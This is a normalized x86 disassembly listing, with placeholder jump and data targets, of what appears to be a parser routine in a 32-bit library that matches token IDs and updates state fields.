pop ebp
retn
mov eax [ esi + 0x10 ]
mov ecx [ eax + ebx * 4 ]
push ecx
push edi
call sub_1006fd10
inc ebx
add esp 0x8
cmp ebx [ esi + 0x14 ]
jb r-xdata
mov edx [ esi + 0x4c ]
push edx
push edi
call sub_10035fe0
xor ebx ebx
add esp 0x8
cmp [ esi + 0x14 ] ebx
jbe r-xdata
lea esp [ esp ]
mov edx [ esi + 0x10 ]
push edx
jmp r-xdata
lea ebx [ ebx ]
mov eax [ esi + 0x4c ]
mov ecx [ eax + ebx * 4 ]
push ecx
push edi
call sub_100019c0
inc ebx
add esp 0x8
cmp ebx [ esi + 0x50 ]
jb r-xdata
push edi
call sub_10035fe0
add esp 0x8
pop ebx
mov eax [ esi + 0x10 ]
mov ecx [ eax + ebx * 4 ]
push ecx
push edi
call sub_1006fd10
inc ebx
add esp 0x8
cmp ebx [ esi + 0x14 ]
jb r-xdata
sub_1006fe10
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0xc ]
mov eax [ ebx ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ esi + 0xc ]
mov [ ebp - 0x4 ] edi
cmp eax 0x6
je r-xdata
push esi
mov eax ebx
call sub_1006d7e0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10059bc0
add esp 0xc
cmp eax 0x4
jne r-xdata
cmp eax 0x5
jne r-xdata
push esi
call sub_1006e420
add esp 0x4
mov edi ebx
mov eax esi
call sub_1006e240
cmp eax 0x3
jne r-xdata
push esi
call sub_1006e420
mov edi ebx
mov eax esi
call sub_1006e240
push r--data
call sub_1003bee0
mov edx [ esi + 0xc ]
add esp 0x8
pop edi
pop esi
mov [ edx + 0x3c ] 0x0
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
push esi
mov eax ebx
call sub_1006d7e0
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_10059bc0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_1006dd70
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x8 ]
mov eax [ ecx + eax * 4 - 0x4 ]
push 0x96
push 0x2
push 0x6
push 0x7
push 0x82
push 0x5
push 0x4
push 0x7b
push 0x7e
push 0x8b
push 0x3
push 0x1
mov eax ebx
call sub_1006d8a0
add esp 0x30
test eax eax
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] eax
sete al
test eax eax
je r-xdata
mov edx [ ebx ]
cmp edx 0x1
jne r-xdata
push ebx
push esi
call sub_1006fae0
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_1006d7e0
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x4 ]
push esi
mov edi ebx
call sub_1006ee90
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp edx 0x7
jne r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0xa
sete cl
test ecx ecx
je r-xdata
push 0x96
push 0x0
push 0xa
push 0x0
mov eax ebx
call sub_1006d8a0
add esp 0x10
test eax eax
je r-xdata
cmp [ edi + 0xc ] 0x0
mov [ ebp + 0x8 ] 0x0
jbe r-xdata
xor ecx ecx
cmp eax 0x81
sete cl
mov eax ecx
test eax eax
je r-xdata
push esi
mov eax ebx
call sub_1006d7e0
add esp 0x4
cmp [ edi + 0xc ] 0x2
jb r-xdata
push 0x96
push 0x1e
push 0x79
push 0xc
push 0x19
push 0x1d
push 0xd
push 0x7a
push 0x15
push 0x16
push 0x17
push 0x23
push 0x24
push 0x6a
push 0x20
push 0x26
push 0x7f
push 0x78
push 0x8e
push 0x1c
push 0xe
push 0xb
push 0x18
push 0x1
mov eax ebx
call sub_1006d8a0
add esp 0x60
test eax eax
je r-xdata
push esi
mov eax 0xa
call sub_1006e720
add esp 0x4
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
mov edi [ eax + 0x8 ]
push esi
mov eax ebx
call sub_1006d7e0
add esp 0x4
cmp [ edi + 0xc ] 0x2
jb r-xdata
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10059bc0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x8 ]
mov eax [ ecx + 0x4 ]
push 0xa
call sub_1006d940
add esp 0x4
test eax eax
je r-xdata
push 0x96
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push 0x1
mov eax ebx
call sub_1006d8a0
add esp 0x20
test eax eax
je r-xdata
push ebx
call sub_1006ed80
mov edi ebx
add esp 0x4
mov ebx esi
mov [ ebp + 0x8 ] eax
call sub_1006e0a0
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ edi + 0xc ] 0x0
mov [ ebp + 0xc ] 0x1
mov [ ebp + 0x8 ] 0x0
jbe r-xdata
push esi
mov eax ebx
call sub_1006d7e0
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
inc eax
add edi 0x4
mov [ ebp + 0x8 ] eax
cmp eax [ edx + 0xc ]
jb r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push esi
call sub_10059bc0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ebx edi
mov edx [ ebx + 0x8 ]
mov edi [ edx + 0x4 ]
push 0xa
mov eax edi
call sub_1006d940
add esp 0x4
test eax eax
je r-xdata
mov edx edi
mov [ edx + 0x3c ] 0x0
mov eax [ ecx + 0x4 ]
push esi
mov edi ebx
call sub_1006ee90
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x84
push 0x1b
push 0x1
mov eax ebx
call sub_1006d8a0
add esp 0x10
test eax eax
je r-xdata
push ebx
call sub_1006ed80
add esp 0x4
push 0x96
push 0x14
push 0x13
push 0x12
push 0x11
mov [ ebp + 0x8 ] eax
push 0x10
push 0xf
mov eax esi
call sub_1006d5e0
push eax
call sub_1006d8f0
add esp 0x20
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
mov [ edx ] 0x12
cmp [ ebx ] 0x2
jne r-xdata
mov edx edi
mov edi [ edx + 0x8 ]
mov edi edi
push 0x96
push 0x0
mov ecx [ edi ]
push 0xa
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push 0x19
push 0x1f
push 0x21
push 0x22
push ecx
call sub_1006d8f0
add esp 0x38
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x3c ] 0x0
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
push ebx
call sub_1006ed80
mov edi ebx
add esp 0x4
mov ebx esi
mov [ ebp + 0x8 ] eax
call sub_1006e0a0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax + 0x40 ] 0x1
mov [ eax + 0x3c ] 0x0
mov eax [ ebp + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
mov edi ebx
mov ebx esi
call sub_1006e0a0
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_1006d7e0
add esp 0x4
mov eax esi
call sub_1006dc90
mov ecx [ edi + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov eax [ edi + 0x68 ]
add ecx 0x10
call sub_1006dc50
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
cmp [ ebx + 0x18 ] eax
sete al
test eax eax
je r-xdata
push esi
mov eax ebx
call sub_1006d7e0
mov edi [ ebp - 0x4 ]
add esp 0x4
mov [ ebp + 0xc ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
inc eax
add edi 0x4
mov [ ebp + 0x8 ] eax
cmp eax [ ecx + 0xc ]
jb r-xdata
lea esp [ esp ]
push 0x96
push 0x21
push 0x22
push 0x1
mov eax ebx
call sub_1006d8a0
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x69
sete cl
test ecx ecx
je r-xdata
mov eax [ esi + 0xc ]
pop edi
pop esi
mov [ eax + 0x34 ] 0x1
mov eax [ ebp + 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x0
push 0xa
push 0x66
push 0x64
push 0x68
mov eax [ edi ]
push 0x65
push 0x67
push 0x63
push 0x3d
push 0x3e
push 0x19
push 0x72
push 0x71
push 0x1f
push 0x21
push 0x22
push eax
call sub_1006d8f0
add esp 0x48
test eax eax
je r-xdata
mov edi ecx
jmp r-xdata
mov eax esi
call sub_1006dc90
mov ecx [ ebx + 0x8 ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov ebx esi
call sub_1006e530
mov edx [ ebx + 0x4 ]
mov ecx [ edx + 0x4 ]
mov edx [ ecx + 0x14 ]
add ecx 0x10
xor eax eax
test edx edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
push 0x0
jmp r-xdata
xor edx edx
cmp eax 0x1f
sete dl
mov eax edx
test eax eax
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
push edi
push ebx
call sub_1006fd10
mov edi [ ebp + 0xc ]
add esp 0x8
call sub_1006e0a0
mov eax [ ebx + 0xc ]
pop edi
pop esi
mov [ eax ] 0x13
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ecx ]
lea ebx [ ebx ]
push 0x96
push 0x1e
push 0x79
push 0xc
push 0x1b
push 0x1d
push 0xd
push 0x7a
push 0x84
push 0x15
push 0x16
push 0x17
push 0x23
push 0x24
push 0x6a
push 0x20
push 0x26
push 0x7f
push 0x78
push 0x8e
push 0x6e
push 0x1c
push 0xe
push 0xb
push 0x18
push 0x0
mov eax ebx
call sub_1006d8a0
add esp 0x68
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x88
sete cl
test ecx ecx
je r-xdata
push ebx
push esi
call sub_1006ee00
push ebx
call sub_1006ed80
mov edi ebx
add esp 0x10
mov ebx esi
mov [ ebp + 0x8 ] eax
call sub_1006e0a0
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push ebx
call sub_1006ed80
mov edi ebx
add esp 0x4
mov ebx esi
mov [ ebp + 0x8 ] eax
call sub_1006e0a0
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov [ ecx + 0x30 ] eax
mov eax [ ebp + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
push r--data
call sub_1003bee0
push esi
mov eax ebx
call sub_1006d7e0
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_10059bc0
add esp 0x10
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push ecx
push eax
push ebx
call sub_1002ad70
add esp 0xc
inc eax
add esi 0x4
cmp eax edx
jb r-xdata
cmp [ ebx ] 0x2
jne r-xdata
mov eax [ ebx + 0x18 ]
push esi
call sub_1006e720
add esp 0x4
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x6e
sete cl
mov eax ecx
test eax eax
je r-xdata
push ebx
call sub_1006ed80
mov edi ebx
mov ebx esi
mov [ ebp + 0xc ] eax
call sub_1006e0a0
mov eax ebx
push 0x6
push eax
call sub_1005cfb0
mov eax [ ebp + 0xc ]
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi ] edi
je r-xdata
jmp r-xdata
push 0x96
push 0x21
push 0x22
push 0x0
mov eax ebx
call sub_1006d8a0
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x69
sete cl
test ecx ecx
je r-xdata
mov eax [ ebx + 0x18 ]
push ebx
mov ecx esi
call sub_1006ed00
add esp 0x4
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax 0x6e
call sub_1006e720
add esp 0x4
push esi
test eax eax
je r-xdata
push 0x96
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push 0x0
mov eax ebx
call sub_1006d8a0
add esp 0x20
test eax eax
je r-xdata
mov edi [ ebx + 0x18 ]
push esi
mov eax edi
call sub_1006e720
add esp 0x4
test eax eax
jne r-xdata
xor ecx ecx
cmp eax 0x19
sete cl
test ecx ecx
je r-xdata
mov eax [ edi + 0x30 ]
mov [ ebp - 0x10 ] 0x1
mov [ edi + 0x30 ] 0x0
test eax eax
je r-xdata
call sub_1006e420
mov edi ebx
add esp 0x4
mov ebx esi
call sub_1006e0a0
mov edx [ ebp - 0x4 ]
pop edi
pop esi
mov [ edx + 0x3c ] 0x0
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_1006d7e0
push ebx
mov eax 0x6e
mov ecx esi
call sub_1006ed00
add esp 0x8
mov [ edi + 0x34 ] 0x1
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x1
jne r-xdata
push 0x96
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push esi
call sub_1006e7f0
add esp 0x20
test eax eax
je r-xdata
push ebx
mov eax edi
mov ecx esi
call sub_1006ed00
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_1006d7e0
mov ecx [ esi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push esi
call sub_10059bc0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
xor ecx ecx
cmp eax 0x1f
sete cl
mov eax ecx
test eax eax
je r-xdata
push esi
mov eax 0x19
call sub_1006e8e0
add esp 0x4
test eax eax
jne r-xdata
push r--data
call sub_1003bee0
push esi
mov eax ebx
call sub_1006d7e0
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_10059bc0
add esp 0x10
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ebx eax
mov eax esi
call sub_1006e780
test eax eax
je r-xdata
push 0x96
push 0x3a
push 0x94
push 0x29
push 0x8a
push 0x2a
push 0x2b
push 0x38
push 0x8f
push 0x28
push 0x32
push 0x8c
push 0x39
push 0x1
mov eax ebx
call sub_1006d8a0
add esp 0x38
test eax eax
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x27
sete al
test eax eax
je r-xdata
mov edi 0x96
call sub_1006e9c0
mov edx [ ebx + 0x18 ]
push edx
mov eax esi
call sub_1006d5e0
call sub_1006d940
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
push esi
mov eax 0x1f
call sub_1006e880
add esp 0x4
test eax eax
je r-xdata
push ebx
mov eax 0x19
mov ecx esi
call sub_1006ed00
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_1006d7e0
push esi
call sub_1006e420
push 0x19
mov eax 0x10
mov ecx esi
call sub_1006e0e0
add esp 0xc
mov [ edi + 0x34 ] 0x1
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0xc ]
mov edi 0x96
call sub_1006e9c0
mov eax esi
call sub_1006d5e0
cmp eax ebx
je r-xdata
mov edi [ ebx ]
cmp edi 0x1
jne r-xdata
push esi
call sub_1006e420
mov edi ebx
add esp 0x4
mov ebx esi
call sub_1006e0a0
mov ebx eax
mov edi esi
call sub_1006e3b0
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp + 0xc ]
push eax
mov eax esi
mov [ ebp - 0x4 ] 0x1
call sub_1006e300
add esp 0x4
test eax eax
je r-xdata
mov eax esi
call sub_1006dc90
push 0x96
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push eax
call sub_1006d8f0
add esp 0x20
test eax eax
je r-xdata
push esi
mov eax ebx
call sub_1006d7e0
add esp 0x4
push ebx
mov eax 0x1f
mov ecx esi
call sub_1006ed00
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
push esi
call sub_1006d7e0
add esp 0x4
xor edi edi
jmp r-xdata
push 0x96
push 0x3a
push 0x94
push 0x29
push 0x8a
push 0x2a
push 0x2b
push 0x92
push 0x38
push 0x8f
push 0x28
push 0x32
push 0x8c
push 0x39
push 0x27
push 0x0
mov eax ebx
call sub_1006d8a0
add esp 0x40
test eax eax
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x92
sete al
test eax eax
je r-xdata
push esi
call sub_1006e420
mov edi ebx
add esp 0x4
mov ebx esi
call sub_1006e0a0
mov ebx eax
mov edi esi
call sub_1006e3b0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_1006d7e0
push 0x27
push ebx
push esi
call sub_1006f230
lea ecx [ ebp + 0xc ]
push ecx
mov eax esi
call sub_1006e300
add esp 0x14
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edx
push eax
push esi
call sub_1002ad70
add esp 0xc
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edx ]
lea ecx [ ecx + eax * 4 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
add edx 0x8
dec eax
js r-xdata
push 0x96
push 0x4a
push 0x90
push 0x7c
push 0x1
mov eax ebx
call sub_1006d8a0
add esp 0x14
test eax eax
je r-xdata
mov ecx [ ebx + 0x18 ]
push ecx
push ebx
push esi
call sub_1006f230
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov [ ebp + 0xc ] edi
call sub_1006e420
push esi
mov eax 0x92
call sub_1006e720
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
lea edx [ edi + 0x14 ]
push edx
push eax
push esi
call sub_1002ad70
add edi 0x8
push edi
push eax
push esi
call sub_1001b720
add esp 0x18
sub ecx 0x4
dec eax
jns r-xdata
push 0x96
push 0x4a
push 0x90
push 0x7c
push 0x0
mov eax ebx
call sub_1006d8a0
add esp 0x14
test eax eax
je r-xdata
push esi
call sub_1006e420
mov edi ebx
mov ebx esi
call sub_1006e0a0
mov ebx r--data
mov edi esi
call sub_1006e3b0
push edi
call sub_1006d4e0
add esp 0x8
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov edi ebx
mov ebx esi
call sub_1006e0a0
mov edi ebx
mov eax edi
call sub_1006d5e0
mov ebx eax
call sub_1006e3b0
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
mov [ ebp + 0xc ] 0x0
call sub_1006d7e0
push 0x92
push ebx
push esi
call sub_1006f230
push esi
call sub_1006e420
add esp 0x14
cmp [ ecx ] ebx
je r-xdata
cmp edi 0x1
jne r-xdata
mov edi [ ebx + 0x18 ]
push esi
mov eax edi
call sub_1006e940
add esp 0x4
test eax eax
je r-xdata
push 0x96
push 0x43
push 0x74
push 0x46
push 0x47
push 0x49
push 0x42
push 0x52
push 0x1
mov eax ebx
call sub_1006d8a0
add esp 0x24
test eax eax
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x5f
sete al
test eax eax
je r-xdata
push ebx
mov eax edi
mov ecx esi
call sub_1006ed00
add esp 0x4
mov ebx esi
call sub_1006e530
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0x1
cmp edi 0x1
jne r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ecx ]
cmp [ edx + 0x2c ] edi
je r-xdata
push 0x96
push 0x4f
push 0x4e
push 0x4b
push 0x1
mov eax ebx
call sub_1006d8a0
add esp 0x14
test eax eax
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x6d
sete al
test eax eax
je r-xdata
push esi
call sub_1006e420
mov edi ebx
add esp 0x4
mov ebx esi
call sub_1006e0a0
mov esi eax
mov eax edi
cmp [ eax ] 0x1
jne r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x46
sete al
test eax eax
je r-xdata
mov edi ebx
mov ebx esi
call sub_1006e0a0
push esi
call sub_1006d4e0
mov eax [ esi + 0xc ]
add esp 0x4
pop edi
pop esi
mov [ eax ] 0x8
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push ebx
call sub_1006ed80
add esp 0x4
cmp edi 0x1
jne r-xdata
mov edi ebx
mov ebx esi
call sub_1006e0a0
mov eax esi
call sub_1006dc90
mov ecx [ esi + 0xc ]
pop edi
mov eax 0x1
pop esi
mov [ ecx + 0x38 ] eax
pop ebx
mov esp ebp
pop ebp
retn
push r--data
lea ecx [ ebx + 0x1c ]
mov eax r--data
call sub_1006d430
add esp 0x4
test eax eax
jne r-xdata
mov edi ebx
mov ebx [ ebp - 0x4 ]
xor ecx ecx
cmp [ eax + 0x18 ] 0x46
sete cl
test ecx ecx
je r-xdata
push esi
mov eax ebx
mov [ ebp - 0x4 ] 0x0
call sub_1006d7e0
add esp 0x4
mov [ ebx + 0x18 ] 0x47
push 0x96
push 0x71
push 0x72
push 0x1
mov eax ebx
call sub_1006d8a0
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x1a
sete cl
test ecx ecx
je r-xdata
push esi
call sub_1006e420
mov edi ebx
add esp 0x4
mov ebx esi
call sub_1006e0a0
mov eax esi
call sub_1006dc90
mov edx [ esi + 0xc ]
pop edi
mov eax 0x1
pop esi
mov [ edx + 0x38 ] eax
pop ebx
mov esp ebp
pop ebp
retn
push esi
call sub_1006d4e0
add esp 0x4
mov edi [ ebp + 0x8 ]
push edi
xor ebx ebx
call sub_1006d7e0
add esp 0x4
or [ esi + 0xc ] 0x40
mov [ esi + 0x1c ] 0x47
jmp r-xdata
push 0x96
push 0x3d
push 0x3e
push 0x1
mov eax ebx
call sub_1006d8a0
add esp 0x10
test eax eax
je r-xdata
push 0x72
mov eax esi
call sub_1006d5e0
call sub_1006d940
add esp 0x4
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x83
sete cl
test ecx ecx
je r-xdata
push ebx
call sub_1006ed80
mov edi ebx
mov ebx esi
mov [ ebp + 0xc ] eax
call sub_1006e0a0
mov eax esi
call sub_1006dc90
mov edx [ esi + 0xc ]
push esi
mov [ edx + 0x38 ] 0x1
call sub_1006d4e0
mov eax [ ebp + 0xc ]
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_1006dc90
mov ecx [ edi + 0xc ]
push edi
mov [ ecx + 0x38 ] 0x1
call sub_1006d4e0
add esp 0x4
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x2
jne r-xdata
push esi
mov eax 0x3c
mov [ ebp + 0x8 ] 0x1
call sub_1006e720
add esp 0x4
test eax eax
je r-xdata
push esi
call sub_1006e420
mov edi ebx
add esp 0x4
mov ebx esi
call sub_1006e0a0
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_1006dc90
xor ecx ecx
cmp eax 0x73
sete cl
test ecx ecx
je r-xdata
push esi
mov eax ebx
call sub_1006d7e0
mov eax [ esi + 0xc ]
add esp 0x4
cmp [ eax + 0x30 ] 0x0
je r-xdata
cmp edi 0x1
jne r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x42
sete al
test eax eax
je r-xdata
push 0x3c
mov eax esi
call sub_1006d5e0
call sub_1006d940
add esp 0x4
test eax eax
jne r-xdata
mov edi 0x96
call sub_1006e9c0
xor ecx ecx
cmp eax 0x85
sete cl
test ecx ecx
je r-xdata
push 0x2
mov eax ebx
call sub_1006e2a0
mov eax [ esi + 0xc ]
push esi
mov [ eax + 0x40 ] 0x1
call sub_1006d4e0
add esp 0x8
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push ebx
mov [ eax + 0x38 ] 0x1
call sub_1006ed80
push esi
call sub_1006d4e0
lea edi [ ebx + 0x1c ]
push r--data
push edi
mov [ ebp - 0x10 ] edi
call sub_1005a810
push r--data
push edi
mov [ ebp + 0x8 ] eax
call sub_1005a810
push r--data
push edi
mov [ ebp + 0xc ] eax
call sub_1005a810
mov [ ebp - 0xc ] eax
push 0x69
mov eax 0x20
mov ecx esi
call sub_1006e0e0
add esp 0x24
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ eax + 0x68 ]
push eax
push esi
call sub_10059bc0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push 0x1
push 0x80
push 0x61
push 0x62
push 0x60
push 0x1
mov eax ebx
call sub_1006d8a0
add esp 0x34
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x53
sete cl
test ecx ecx
je r-xdata
push esi
mov eax ebx
call sub_1006d7e0
push esi
call sub_1006e420
push 0x42
lea eax [ edi + 0xe ]
mov ecx esi
call sub_1006e0e0
add esp 0xc
mov eax esi
call sub_1006dc90
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_1006d7e0
add esp 0x4
jmp r-xdata
xor ecx ecx
cmp eax 0x48
sete cl
test ecx ecx
je r-xdata
push ebx
call sub_1006ed80
push esi
mov edi eax
call sub_1006e420
push esi
call sub_1006d4e0
push 0x4
mov eax ebx
call sub_1006e2a0
add esp 0x10
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1a
mov eax 0x20
mov ecx esi
call sub_1006e0e0
mov eax esi
call sub_1006dc90
push 0x6c
mov eax 0x20
mov ecx esi
call sub_1006e0e0
mov edi [ esi + 0xc ]
mov edx [ ebx + 0x10 ]
add edi 0x48
mov [ edi + 0xc ] edx
mov eax [ ebx + 0x4 ]
mov [ edi + 0x10 ] eax
mov ecx [ ebx + 0x8 ]
mov [ edi + 0x14 ] ecx
mov edx [ ebx + 0xc ]
add esp 0x8
cmp [ ebp + 0x8 ] 0x0
mov [ edi + 0x18 ] edx
mov [ edi + 0x1c ] 0x2
je r-xdata
mov ecx [ ebp + 0xc ]
add eax 0x4c
push eax
push ecx
push esi
call sub_100049a0
add esp 0xc
cmp edi 0x1
je r-xdata
xor ecx ecx
cmp eax 0x5c
sete cl
mov eax ecx
test eax eax
je r-xdata
push esi
call sub_1006e420
mov eax ebx
mov edi esi
call sub_1006efc0
push esi
mov eax ebx
call sub_1006ef00
push esi
mov eax 0x2
call sub_1006e130
add esp 0xc
mov [ ebp + 0x8 ] 0x0
xor ecx ecx
cmp eax 0x87
sete cl
test ecx ecx
je r-xdata
push esi
call sub_1006d4e0
push 0x4
mov eax ebx
call sub_1006e2a0
add esp 0x8
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push edi
lea ecx [ ebp - 0x8 ]
push ecx
push esi
mov [ ebp - 0x8 ] r--data
mov [ ebp - 0x4 ] 0x33
call sub_1004c110
add esp 0xc
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
lea edx [ eax + 0x1 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edi [ ecx + 0xc ]
dec edi
mov eax [ ebx + 0x18 ]
mov [ ebp + 0x8 ] eax
js r-xdata
push esi
call sub_1006e420
push esi
mov eax ebx
call sub_1006ef60
push esi
mov eax ebx
call sub_1006ef00
push esi
mov eax 0x1
call sub_1006e130
add esp 0x10
jmp r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_1006dc90
mov eax [ esi + 0xc ]
mov [ eax + 0x38 ] 0x1
xor ecx ecx
cmp eax 0x6f
sete cl
mov eax ecx
test eax eax
je r-xdata
push 0x4
mov eax ebx
call sub_1006e2a0
add esp 0x4
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10059bc0
push 0x4c
push esi
call sub_10020380
mov edi r--data
mov ebx eax
push edi
push esi
mov [ ebx ] 0x0
call sub_1000ad70
push r--data
push esi
mov [ ebx + 0x4 ] eax
call sub_1000ad70
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x8 ] edi
mov eax 0x4
mov [ ebx + 0xc ] eax
mov eax r--data
mov [ ebx + 0x14 ] eax
mov eax 0x7
mov [ ebx + 0x18 ] eax
mov edx [ r--data ]
mov [ ebx + 0x1c ] edx
mov eax [ r--data ]
